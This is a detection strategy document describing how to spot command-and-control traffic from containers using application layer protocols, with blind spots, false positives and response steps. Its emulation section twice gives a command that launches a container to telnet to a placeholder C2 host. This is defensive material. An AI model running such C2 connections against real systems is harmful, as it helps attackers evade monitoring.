# Alerting & Detection Strategy: Detect Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
This technique aims to detect adversarial attempts to bypass security monitoring by exploiting container technologies. Specifically, it focuses on identifying malicious activities that leverage application layer protocols within container environments.

## Categorization
- **MITRE ATT&CK Mapping:** T1071 - Application Layer Protocol
- **Tactic / Kill Chain Phases:** Command and Control
- **Platforms:** Linux, macOS, Windows

## Strategy Abstract
The detection strategy involves monitoring container activities to identify anomalous application layer protocol usage. Key data sources include network traffic logs, container runtime metrics, and system event logs. Patterns analyzed involve unusual communication channels or unexpected protocol behavior within containers, which may indicate an attempt to establish Command and Control (C2) channels.

## Technical Context
Adversaries exploit container environments by using legitimate protocols in a malicious manner. They might run command-and-control servers within containers to evade traditional network security monitoring tools. Adversary emulation can include setting up Telnet-based C2 channels, where containers are configured to connect to external C2 servers using application layer protocols.

### Adversary Emulation Details
- **Sample Commands:**
  - Launching a containerized Telnet client to communicate with an external C2 server.
  - Example: `docker run --rm alpine telnet c2.example.com 4444`

## Blind Spots and Assumptions
- **Blind Spots:** 
  - Encrypted communication channels may obscure malicious activities.
  - High-privilege user operations within containers could bypass some monitoring controls.

- **Assumptions:**
  - Network traffic logs are comprehensive and accurately capture all container-related communications.
  - Container runtime environments are fully monitored and integrated with security tools.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of application layer protocols for development or testing purposes within containers.
- Misconfigured applications that inadvertently establish unusual network connections.

## Priority
**Priority: High**

Justification: The ability to bypass traditional security monitoring using container technologies poses a significant risk. Containers are widely used in modern IT environments, making this vector highly attractive to adversaries.

## Validation (Adversary Emulation)
### Step-by-Step Instructions

1. **Set Up Environment:**
   - Ensure Docker is installed and running on your test system.
   - Prepare a container image that includes networking tools like `telnet`.

2. **Launch Telnet C2 Simulation:**
   - Run the following command to start a containerized Telnet client:
     ```bash
     docker run --rm alpine telnet c2.example.com 4444
     ```

3. **Monitor Network Traffic:**
   - Use network monitoring tools to capture and analyze traffic from the container.
   - Look for unusual connections or data patterns indicative of C2 activity.

## Response
When an alert fires:
- **Immediate Actions:**
  - Isolate the affected container(s) from the network to prevent further communication with potential C2 servers.
  - Capture and preserve network logs for forensic analysis.

- **Investigation Steps:**
  - Analyze container configurations and running processes to identify any unauthorized changes or activities.
  - Review system event logs for related indicators of compromise (IOCs).

- **Remediation:**
  - Remove malicious containers and restore affected systems from known good backups if necessary.
  - Update security policies and monitoring rules to prevent similar incidents.
